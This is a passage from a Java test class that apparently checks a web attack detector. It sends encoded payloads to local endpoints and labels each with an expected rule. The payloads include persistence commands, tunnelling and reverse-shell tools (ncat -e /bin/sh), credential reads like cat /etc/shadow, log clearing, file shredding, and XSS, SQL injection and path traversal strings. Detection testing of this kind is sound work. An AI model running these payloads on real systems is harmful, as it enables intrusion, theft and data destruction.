            "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        };
        String[] names = {"CRONTAB", "SCHTASKS", "CRON_DAILY", "AUTHORIZED_KEYS", "REG_ADD"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("Install-" + names[i], "installation", "installation-attack",
                        BASE_URL + "/setup?cmd=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] Installation: " + e.getMessage());
            }
        }
    }

    // ==================== C2 + Actions - 20 tests ====================

    @Test
    @DisplayName("Command Control - C2 Communication")
    void testCommandControlC2Communication() {
        String[] payloads = {
            "frpc -c /tmp/frpc.ini",
            "ngrok tcp 3389",
            "chisel client 1.2.3.4:80 R:socks",
            "ew_for_linux -s ssocksd -l 1080",
            "ncat 10.0.0.1 -e /bin/sh"
        };
        String[] names = {"FRPC", "NGROK", "CHISEL", "EW", "NCAT_E"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("C2-" + names[i], "command_control", "c2-communication", BASE_URL + "/agent?task=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] C2: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Actions - Objectives Behaviors")
    void testActionsOnObjectives() {
        String[] payloads = {
            "mysqldump -u root -p123 --all-databases",
            "cat /etc/shadow",
            "wevtutil cl Security",
            "shred /var/data.db",
            "dd if=/dev/zero of=/tmp/disk.img"
        };
        String[] names = {"MYSQLDUMP", "CAT_SHADOW", "WEVTUTIL", "SHRED", "DD_ZERO"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
                executeGet("ActionObj-" + names[i], "actions", "actions-on-objectives",
                        BASE_URL + "/ops?action=" + encodedPayload);
            } catch (Exception e) {
                System.out.println("[ERROR] ActionsObj: " + e.getMessage());
            }
        }
    }

    // ==================== Actions - 10 tests ====================

    @Test
    @DisplayName("Actions - JSONP Attack")
    void testActionsJsonp() {
        String[] payloads = {
            "callback=alert(1)",
            "jsonp=alert(1);",
            "func=<script>alert(1)</script>",
            "cb=eval(document.cookie)",
            "jQuery123456789=alert(1)"
        };
        String[] expectedRules = {
            "unknown",
            "unknown",
            "xss-attack",
            "code-execution",
            "unknown"
        };
        String[] names = {"CALLBACK", "JSONP_FUNC", "SCRIPT_TAG", "EVAL_COOKIE", "JQUERY"};
        for (int i = 0; i < payloads.length; i++) {
            try {
                String[] pair = payloads[i].split("=", 2);
                String key = pair[0];
                String value = pair.length > 1 ? URLEncoder.encode(pair[1], "UTF-8") : "";
                executeGet("JSONP-" + names[i], "actions", expectedRules[i], BASE_URL + "/api?" + key + "=" + value);
            } catch (Exception e) {
                System.out.println("[ERROR] JSONP-" + names[i] + ": " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Actions - Sensitive Data Access")
    void testActionsSensitiveData() {
        String[] endpoints = {
            "/api/users", "/api/admin", "/api/config",
            "/api/database", "/api/logs", "/api/keys",
            "/api/secrets", "/api/passwords"
        };
        String[] names = {"USERS", "ADMIN", "CONFIG", "DATABASE", "LOGS", "KEYS", "SECRETS", "PASSWORDS"};
        for (int i = 0; i < endpoints.length; i++) {
            executeGet("Sensitive-" + names[i], "actions", "sensitive-data-access", BASE_URL + endpoints[i]);
        }
    }

    // ==================== Additional Tests to reach 50+ ====================

    @Test
    @DisplayName("Additional - Additional Attack Vectors")
    void testAdditionalVectors() {
        String[] names = {
            "SEARCH_XSS", "QUERY_SQL", "USER_SQL", "VIEW_PATH", "RENDER_SSTI",
            "DATA_XSS", "PROFILE_SQL", "COMMENT_XSS", "UPLOAD_FILE", "DOWNLOAD_PATH"
        };
        String[] paths = {
            "/search", "/query", "/user", "/view", "/render",
            "/api/getData", "/profile", "/comment", "/upload", "/download"
        };
        String[] params = {
            "q", "name", "id", "file", "template",
            "data", "username", "text", "file", "path"
        };
        String[] values = {
            "<script>alert(1)</script>",
            "test' OR '1'='1",
            "1 UNION SELECT * FROM admin",
            "../../../../etc/passwd",
            "${7*7}",
            "<img src=x onerror=alert(1)>",
            "admin'--",
            "<svg onload=alert(1)>",
            "shell.jsp",
            "../../../windows/win.ini"
        };
        String[] expectedRules = {
            "xss-attack", "sql-injection", "sql-injection", "path-traversal", "template-injection",
            "xss-attack", "sql-injection", "xss-attack", "unknown", "path-traversal"
        };

        for (int i = 0; i < names.length; i++) {
            try {
                String encoded = URLEncoder.encode(values[i], "UTF-8");
                String url = BASE_URL + paths[i] + "?" + params[i] + "=" + encoded;
                executeGet("Add-" + names[i], "delivery", expectedRules[i], url);
            } catch (Exception e) {
                System.out.println("[ERROR] Additional-" + names[i] + ": " + e.getMessage());
            }
        }
    }
}
